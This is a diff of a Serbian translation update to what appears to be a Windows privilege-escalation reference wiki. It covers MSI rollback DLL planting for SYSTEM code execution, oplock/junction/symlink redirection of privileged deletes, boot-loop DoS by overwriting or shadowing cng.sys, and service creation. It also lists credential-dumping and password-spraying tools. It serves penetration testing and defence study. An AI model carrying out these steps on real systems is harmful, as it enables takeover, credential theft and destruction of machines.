-- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.
+- Ponovo kreirajte `C:\Config.Msi` folder sami.
+- Postavite **weak DACLs** (npr. Everyone:F), i **držite otvoren handle** sa `WRITE_DAC`.
 
 - Step 7: Run Another Install
-- Install the `.msi` again, with:
+- Instalirajte `.msi` ponovo, sa:
 - `TARGETDIR`: Writable location.
-- `ERROROUT`: A variable that triggers a forced failure.
-- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.
+- `ERROROUT`: Promenljiva koja izaziva namerno neuspeh.
+- Ova instalacija će biti korišćena da ponovo trigger-uje **rollback**, koji čita `.rbs` i `.rbf`.
 
 - Step 8: Monitor for `.rbs`
-- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
-- Capture its filename.
+- Koristite `ReadDirectoryChangesW` da nadgledate `C:\Config.Msi` dok se ne pojavi novi `.rbs`.
+- Uhvatite njegovo ime fajla.
 
 - Step 9: Sync Before Rollback
-- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
-- Signals an event when the `.rbs` is created.
-- Then **waits** before continuing.
+- `.msi` sadrži **custom install action (`SyncBeforeRollback`)** koja:
+- Signalizira event kada je `.rbs` kreiran.
+- Zatim **čeka** pre nego što nastavi.
 
 - Step 10: Reapply Weak ACL
-- After receiving the `.rbs created` event:
-- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
-- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.
+- Nakon prijema `'.rbs created'` event-a:
+- Windows Installer **ponovo primenjuje strong ACLs** na `C:\Config.Msi`.
+- Ali pošto i dalje imate handle sa `WRITE_DAC`, možete ponovo **primeniti weak ACLs**.
 
-> ACLs are **only enforced on handle open**, so you can still write to the folder.
+> ACLs se **primenjuju samo pri otvaranju handle-a**, tako da i dalje možete pisati u folder.
 
 - Step 11: Drop Fake `.rbs` and `.rbf`
-- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
-- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
-- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.
+- Overwrite `.rbs` fajl lažnim rollback script-om koji kaže Windows-u da:
+- Restore-uje vaš `.rbf` fajl (malicious DLL) u **privileged location** (npr. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
+- Postavi vaš lažni `.rbf` koji sadrži **malicious SYSTEM-level payload DLL**.
 
 - Step 12: Trigger the Rollback
-- Signal the sync event so the installer resumes.
-- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
-- This causes **rollback to begin**.
+- Signalizirajte sync event tako da installer nastavi.
+- A **type 19 custom action (`ErrorOut`)** je konfigurisan da **namerno fail-uje install** u poznatoj tački.
+- Ovo izaziva početak **rollback**-a.
 
 - Step 13: SYSTEM Installs Your DLL
 - Windows Installer:
-- Reads your malicious `.rbs`.
-- Copies your `.rbf` DLL into the target location.
-- You now have your **malicious DLL in a SYSTEM-loaded path**.
+- Čita vaš maliciozni `.rbs`.
+- Kopira vaš `.rbf` DLL u ciljnu lokaciju.
+- Sada imate svoj **malicious DLL u SYSTEM-loaded path**.
 
 - Final Step: Execute SYSTEM Code
-- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
-- **Boom**: Your code is executed **as SYSTEM**.
+- Pokrenite pouzdan **auto-elevated binary** (npr. `osk.exe`) koji učitava DLL koji ste hijack-ovali.
+- **Boom**: vaš kod se izvršava **as SYSTEM**.
 
 
 ### From Arbitrary File Delete/Move/Rename to SYSTEM EoP
 
 The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?
 
-You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
+Možete iskoristiti **NTFS internals**: svaki folder ima skriveni alternate data stream nazvan:
 ```
 C:\SomeFolder::$INDEX_ALLOCATION
 ```
-Ovaj stream čuva **metapodatke indeksa** foldera.
+Ovaj stream čuva **metapodatke indeksa** fascikle.
 
-Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** foldera, NTFS **uklanja ceo folder** iz fajl-sistema.
+Dakle, ako **obrišete `::$INDEX_ALLOCATION` stream** fascikle, NTFS **uklanja celu fasciklu** iz fajl-sistema.
 
-Ovo možete uraditi koristeći standardne API-je za brisanje fajlova kao što su:
+To možete uraditi koristeći standardne API-je za brisanje fajlova, kao što su:
 ```c
 DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
 ```
-> Iako pozivate *file* delete API, on **briše sam folder**.
+> Iako pozivate *file* delete API, ono **briše samu fasciklu**.
 
-### From Folder Contents Delete to SYSTEM EoP
-Šta ako vaš primitive ne dozvoljava da izbrišete proizvoljne fajlove/foldere, ali **dozvoljava brisanje *contents* foldera pod kontrolom napadača**?
+### Od brisanja sadržaja foldera do SYSTEM EoP
+Šta ako vaš primitiv ne dozvoljava brisanje proizvoljnih fajlova/foldera, ali ono **dozvoljava brisanje *sadržaja* foldera koji kontroliše napadač**?
 
-1. Step 1: Postavite bait folder i file
-- Kreirajte: `C:\temp\folder1`
+1. Korak 1: Pripremite mamac folder i fajl
+- Napravite: `C:\temp\folder1`
 - Unutar njega: `C:\temp\folder1\file1.txt`
 
-2. Step 2: Postavite **oplock** na `file1.txt`
-- Oplock **pauzira izvođenje** kada privilegovani proces pokuša da obriše `file1.txt`.
+2. Korak 2: Postavite **oplock** na `file1.txt`
+- Oplock **pauzira izvršavanje** kada privilegovani proces pokuša da izbriše `file1.txt`.
 ```c
 // pseudo-code
 RequestOplock("C:\\temp\\folder1\\file1.txt");
 WaitForDeleteToTriggerOplock();
 ```
-3. Korak 3: Pokrenite SYSTEM proces (npr., `SilentCleanup`)
-- Ovaj proces skenira foldere (npr., `%TEMP%`) i pokušava da obriše njihov sadržaj.
-- Kada stigne do `file1.txt`, **oplock triggers** i prepušta kontrolu vašem callback-u.
+3. Korak 3: Pokreni SYSTEM proces (npr. `SilentCleanup`)
+- Ovaj proces skenira foldere (npr. `%TEMP%`) i pokušava da obriše njihov sadržaj.
+- Kada stigne do `file1.txt`, **oplock triggers** i predaje kontrolu tvom callback-u.
 
-4. Korak 4: Unutar oplock callback-a – preusmerite brisanje
+4. Korak 4: Unutar oplock callback-a – preusmeri brisanje
 
-- Opcija A: Premestite `file1.txt` negde drugo
-- Ovo prazni `folder1` bez narušavanja oplock-a.
-- Nemojte direktno brisati `file1.txt` — to bi prerano oslobodilo oplock.
+- Opcija A: Premesti `file1.txt` na drugo mesto
+- Ovo prazni `folder1` bez prekidanja oplock-a.
+- Ne briši `file1.txt` direktno — to bi prerano oslobodilo oplock.
 
-- Opcija B: Konvertujte `folder1` u **junction**:
+- Opcija B: Pretvori `folder1` u **junction**:
 ```bash
 # folder1 is now a junction to \RPC Control (non-filesystem namespace)
 mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
 ```
-- Opcija C: Napravite **symlink** u `\RPC Control`:
+- Opcija C: Kreirajte **symlink** u `\RPC Control`:
 ```bash
 # Make file1.txt point to a sensitive folder stream
 CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
 ```
-> Ovo cilja NTFS internal stream koji čuva metapodatke direktorijuma — brisanjem njega briše se direktorijum.
+> Ovo cilja NTFS interni stream koji čuva metapodatke foldera — brisanje tog streama briše folder.
 
 5. Korak 5: Oslobađanje oplock-a
-- SYSTEM process nastavlja i pokušava da obriše `file1.txt`.
+- SYSTEM proces nastavlja i pokušava da obriše `file1.txt`.
 - Ali sada, zbog junction + symlink, zapravo briše:
 ```
 C:\Config.Msi::$INDEX_ALLOCATION
 ```
-**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM.
+**Rezultat**: `C:\Config.Msi` je obrisan od strane SYSTEM-a.
 
-### Od Arbitrary Folder Create do trajnog DoS-a
+### Od kreiranja proizvoljnog foldera do trajnog DoS-a
 
-Iskoristite primitiv koji vam omogućava da **create an arbitrary folder as SYSTEM/admin** — čak i ako **you can’t write files** ili **set weak permissions**.
+Iskoristite primitiv koji vam omogućava da **kreirate proizvoljan folder kao SYSTEM/admin** — čak i ako **ne možete pisati fajlove** ili **postaviti slabe dozvole**.
 
-Kreirajte **folder** (not a **file**) sa imenom **critical Windows driver**, npr.:
+Kreirajte **folder** (ne fajl) sa imenom **kritičnog Windows drajvera**, npr.:
 ```
 C:\Windows\System32\cng.sys
 ```
-- Ovaj put obično odgovara kernel-mode driveru `cng.sys`.
-- Ako ga **pre-kreirate kao folder**, Windows neće uspeti da učita stvarni driver pri boot-u.
+- Ova putanja obično odgovara kernel-mode drajveru `cng.sys`.
+- Ako je **pre-kreirate kao folder**, Windows neće uspeti da učita stvarni drajver pri boot-u.
 - Zatim, Windows pokušava da učita `cng.sys` tokom boot-a.
-- Vidi folder, **ne uspeva da razreši stvarni driver**, i **sruši se ili zaustavi boot**.
+- Uoči folder, **ne uspeva da razreši stvarni drajver**, i **sruši se ili zaustavi boot**.
 - Nema **fallback**, i **nema oporavka** bez spoljne intervencije (npr. boot repair ili pristup disku).
 
-### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS
+### Iz privilegovanih log/backup putanja + OM symlinks do arbitrary file overwrite / boot DoS
 
-Kada **privilegisan servis** upisuje logove/eksporte na putanju koja se čita iz **konfiga koji je upisiv**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili privilegisan upis u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).
+Kada **privilegovani servis** upisuje logove/eksporte na putanju koja se čita iz **konfiguracije u koju se može pisati**, preusmerite tu putanju pomoću **Object Manager symlinks + NTFS mount points** da biste pretvorili privilegovani upis u proizvoljno prepisivanje (čak i **bez** SeCreateSymbolicLinkPrivilege).
 
-**Requirements**
-- Konfig koji čuva ciljni put je upisiv od strane napadača (npr. `%ProgramData%\...\.ini`).
-- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlink-a (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
-- Privilegovana operacija koja upisuje na tu putanju (log, export, report).
+**Zahtevi**
+- Konfig koji čuva ciljnu putanju je upisiv od strane napadača (npr. `%ProgramData%\...\.ini`).
+- Mogućnost kreiranja mount point-a ka `\RPC Control` i OM file symlinka (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
+- Privilegovana operacija koja piše na tu putanju (log, export, report).
 
-**Example chain**
-1. Pročitajte konfig da biste otkrili destinaciju privilegisanog loga, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
+**Primer lanca**
+1. Pročitajte konfiguraciju da dobijete destinaciju privilegovanog log fajla, npr. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` u `C:\ProgramData\ICONICS\IcoSetup64.ini`.
 2. Preusmerite putanju bez admin prava:
 ```cmd
 mkdir C:\users\iconics_user\AppData\Local\Temp\logs
 CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
 CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
 ```
-3. Sačekajte da privilegovani komponent napiše log (npr. admin pokrene "send test SMS"). Upis sada završava u `C:\Windows\System32\cng.sys`.
-4. Pregledajte prepisani cilj (hex/PE parser) da potvrdite korupciju; reboot primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se takođe generalizuje na bilo koji zaštićeni fajl koji će privilegovani servis otvoriti za pisanje.
+3. Sačekajte da privilegovana komponenta upiše log (npr. admin pokrene "send test SMS"). Upis sada završava u `C:\Windows\System32\cng.sys`.
+4. Pregledajte prepisanu metu (hex/PE parser) da potvrdite korupciju; ponovno pokretanje primorava Windows da učita izmenjenu putanju drajvera → **boot loop DoS**. Ovo se takođe generalizuje na bilo koju zaštićenu datoteku koju privilegovana usluga otvori za pisanje.
 
-> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako kopija postoji u `C:\Windows\System32\cng.sys` može se pokušati prva, što ga čini pouzdanim DoS sinkom za korumpirane podatke.
+> `cng.sys` se obično učitava iz `C:\Windows\System32\drivers\cng.sys`, ali ako postoji kopija u `C:\Windows\System32\cng.sys` ona može biti pokušana prva, što ga čini pouzdanim DoS odredištem za oštećene podatke.
 
 
 
@@ -1630,39 +1630,39 @@ CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
 
 ### **Novi servis**
 
-Ako već izvršavate proces na High Integrity, **put do SYSTEM-a** može biti lak samo **kreiranjem i izvršavanjem novog servisa**:
+Ako već pokrećete proces sa High Integrity, **put do SYSTEM** može biti jednostavan samo **kreiranjem i pokretanjem novog servisa**:
 ```
 sc create newservicename binPath= "C:\windows\system32\notepad.exe"
 sc start newservicename
 ```
 > [!TIP]
-> Prilikom kreiranja service binary uverite se da je validan service ili da binary izvršava neophodne akcije odmah, jer će biti ubijen nakon 20s ako nije validan service.
+> Kada kreirate service binary, uverite se da je validan service ili da binarni fajl izvršava potrebne radnje dovoljno brzo, jer će biti ugašen nakon 20s ako nije validan service.
 
 ### AlwaysInstallElevated
 
-Iz procesa sa High Integrity možete pokušati da omogućite AlwaysInstallElevated registry entries i instalirate reverse shell koristeći _**.msi**_ wrapper.\
+Iz High Integrity procesa možete pokušati da **omogućite AlwaysInstallElevated registry entries** i **instalirate** reverse shell koristeći _**.msi**_ wrapper.\
 [More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)
 
 ### High + SeImpersonate privilege to System
 
-**Možete** [**pronaći kod ovde**](seimpersonate-from-high-to-system.md)**.**
+**Možete** [**find the code here**](seimpersonate-from-high-to-system.md)**.**
 
 ### From SeDebug + SeImpersonate to Full Token privileges
 
-Ako imate te token privileges (verovatno ćete ih naći u već postojećem High Integrity procesu), moći ćete da otvorite gotovo bilo koji proces (ne protected processes) koristeći SeDebug privilege, kopirate token procesa i kreirate proizvoljan proces sa tim tokenom.\
-Ova tehnika obično bira neki proces koji se izvršava kao SYSTEM sa svim token privileges (_da, možete naći SYSTEM processes bez svih token privileges_).\
-**Možete naći** [**primer koda koji izvršava predloženu tehniku ovde**](sedebug-+-seimpersonate-copy-token.md)**.**
-
-### Dll Hijacking
-
-Ako uspete da hijack-ujete dll koji se učitava u procesu koji radi kao SYSTEM, moći ćete da izvršite proizvoljan kod sa tim privilegijama. Dakle, Dll Hijacking je koristan za ovu vrstu eskalacije privilegija, i, što je važnije, mnogo je **lakše postići iz High Integrity procesa** jer će on imati write permissions na foldere korišćene za load-ovanje dll-ova.\
-**Možete** [**saznati više o Dll hijackingu ovde**](dll-hijacking/index.html)**.**
+Ako imate te token privilegije (verovatno ćete ih naći u već postojećem High Integrity procesu), bićete u mogućnosti da **otvorite skoro bilo koji process** (ne zaštićene procese) sa SeDebug privilegijom, **kopirate token** procesa, i kreirate **arbitrary process with that token**.\
+Korišćenjem ove tehnike se obično bira proces koji radi kao SYSTEM sa svim token privilegijama (_da, možete naći SYSTEM procese bez svih token privilegija_).\
+**Možete naći** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**
 
 ### **Named Pipes**
 
-Ova tehnika se koristi od strane meterpreter za eskalaciju u `getsystem`. Tehnika se sastoji u kreiranju pipe-a i zatim kreiranju/abuziranju service-a da piše na taj pipe. Zatim, server koji je kreirao pipe koristeći `SeImpersonate` privilege će moći da impersonate token pipe klijenta (service) i dobije SYSTEM privilegije.\
-Ako želite da [**saznate više o name pipes pročitajte ovo**](#named-pipe-client-impersonation).\
-Ako želite primer [**kako ići od high integrity do System koristeći name pipes pročitajte ovo**](from-high-integrity-to-system-with-name-pipes.md).
+Ova tehnika se koristi od strane meterpreter-a za eskalaciju u `getsystem`. Tehnika se sastoji u **kreiranju pipe-a i zatim kreiranju/zloupotrebi servisa da piše na taj pipe**. Zatim, **server** koji je kreirao pipe koristeći **`SeImpersonate`** privilegiju će moći da **impersonate the token** pipe klijenta (servis) i dobije SYSTEM privilegije.\
+Ako želite da [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
+Ako želite da pročitate primer [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).
+
+### Dll Hijacking
+
+Ako uspete da **hijack a dll** koji se **učitava** od strane **procesa** koji radi kao **SYSTEM**, bićete u mogućnosti da izvršite arbitrary code sa tim privilegijama. Stoga je Dll Hijacking koristan za ovu vrstu privilege escalation, i, štaviše, mnogo je **lakše postići iz High Integrity procesa** jer će imati **write permissions** na folderima koji se koriste za učitavanje dll-ova.\
+**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**
 
 ### **From Administrator or Network Service to System**
 
@@ -1685,44 +1685,44 @@ Ako želite primer [**kako ići od high integrity do System koristeći name pipe
 **PS**
 
 [**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
-[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za misconfigurations i osetljive fajlove (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
-[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava moguće misconfigurations i prikuplja info (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
+[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Proverava za misconfigurations i osetljive fajlove (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detektovano.**\
+[**JAWS**](https://github.com/411Hall/JAWS) **-- Proverava za moguće misconfigurations i prikuplja informacije (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
 [**privesc** ](https://github.com/enjoiz/Privesc)**-- Proverava za misconfigurations**\
-[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP sačuvane session informacije. Koristite -Thorough lokalno.**\
-[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje credentials iz Credential Manager. Detected.**\
-[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Spray-uje prikupljene lozinke kroz domen**\
-[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
+[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Ekstrahuje sačuvane informacije o sesijama iz PuTTY, WinSCP, SuperPuTTY, FileZilla i RDP. Koristite -Thorough lokalno.**\
+[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Ekstrahuje kredencijale iz Credential Manager-a. Detektovano.**\
+[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Primenjuje prikupljene lozinke na ceo domen**\
+[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh je PowerShell ADIDNS/LLMNR/mDNS spoofer i man-in-the-middle alat.**\
 [**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Osnovna privesc Windows enumeracija**\
 [~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Pretražuje poznate privesc ranjivosti (ZASTARELO za Watson)\
-[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna Admin prava)**
+[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Lokalne provere **(Potrebna su Admin prava)**
 
 **Exe**
 
 [**Watson**](https://github.com/rasta-mouse/Watson) -- Pretražuje poznate privesc ranjivosti (mora se kompajlirati koristeći VisualStudio) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
-[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći misconfigurations (više alat za prikupljanje informacija nego privesc) (mora se kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
-[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje credentials iz mnogih softvera (precompiled exe na github-u)**\
+[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Enumeriše host tražeći misconfigurations (više alat za prikupljanje informacija nego čista privesc) (mora se kompajlirati) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
+[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Ekstrahuje kredencijale iz mnogih softvera (precompiled exe na github-u)**\
 [**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port PowerUp-a u C#**\
-[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Provera za misconfigurations (izvršni fajl precompiled na github-u). Ne preporučuje se. Ne radi dobro na Win10.\
-[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz python-a). Ne preporučuje se. Ne radi dobro na Win10.
+[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Proverava za misconfigurations (izvršni fajl precompiled na github-u). Nije preporučeno. Ne radi dobro na Win10.\
+[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Proverava moguće misconfigurations (exe iz python-a). Nije preporučeno. Ne radi dobro na Win10.
 
 **Bat**
 
-[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog post-a (ne zahteva accesschk da bi radio ispravno, ali može da ga koristi).
+[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Alat napravljen na osnovu ovog posta (ne zahteva accesschk da bi pravilno radio ali ga može koristiti).
 
 **Local**
 
-[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita output od **systeminfo** i preporučuje radne exploite (local python)\
-[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita output od **systeminfo** i preporučuje radne exploite (local python)
+[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Čita izlaz od **systeminfo** i preporučuje radne exploite (lokalni python)\
+[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Čita izlaz od **systeminfo** i preporučuje radne exploite (lokalni python)
 
 **Meterpreter**
 
 _multi/recon/local_exploit_suggestor_
 
-You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
+Morate kompajlirati projekat koristeći odgovarajuću verziju .NET-a ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Da biste videli instaliranu verziju .NET-a na žrtvinom hostu možete uraditi:
 ```
 C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
 ```
-## Izvori
+## Reference
 
 - [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
 - [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
@@ -1739,6 +1739,7 @@ C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the 
 - [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)
 
+- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
 - [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
 
 - [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
